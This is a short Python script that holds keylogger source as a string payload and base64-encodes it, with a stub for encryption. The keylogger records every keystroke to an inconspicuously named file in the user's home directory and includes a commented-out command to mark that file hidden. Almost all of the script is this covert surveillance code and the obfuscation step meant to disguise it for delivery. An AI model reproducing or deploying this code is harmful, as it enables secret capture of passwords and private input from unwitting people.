import base64
#import some_encryption_module

#Into payload copy the python file's content (e.g. keylogger-usage.pyw)
payload = """
from pynput.keyboard import Key, Listener
import logging
from os.path import expanduser
import subprocess
home = expanduser("~")

filepath = home + "/.tmp3453.bin"
logging.basicConfig(filename=filepath, level=logging.DEBUG, format='%(asctime)s: %(message)s')
#subprocess.check_call(["attrib","+H",filepath])

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
"""

if __name__ == "__main__":

    #enc_payload = encrypt(payload)
    enc_payload = payload

    # Standard Base64 Encoding
    encodedBytes = base64.b64encode(enc_payload.encode("UTF-8"))
    encodedStr = str(encodedBytes).decode("UTF-8")
    print(encodedStr)